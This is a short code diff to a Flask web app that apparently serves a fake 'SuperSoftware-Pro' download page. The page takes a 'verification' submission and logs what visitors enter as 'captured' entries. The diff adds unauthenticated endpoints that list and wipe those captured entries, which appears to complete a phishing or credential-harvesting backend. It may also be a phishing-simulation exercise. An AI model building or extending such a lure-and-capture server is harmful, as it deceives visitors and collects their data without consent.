@@ -44,6 +44,17 @@ def captured():
     return jsonify({"status": "ok", "message": "Verification submitted. Your download will begin shortly."})
 
 
+@app.route("/api/captured", methods=["GET"])
+def get_captured():
+    return jsonify({"entries": load_log()})
+
+
+@app.route("/api/clear", methods=["GET", "POST"])
+def clear_captured():
+    save_log([])
+    return jsonify({"status": "ok"})
+
+
 # Dummy file download so the real link works
 @app.route("/files/SuperSoftware-Pro-v3.2.1-win64.exe")
 def dummy_file():
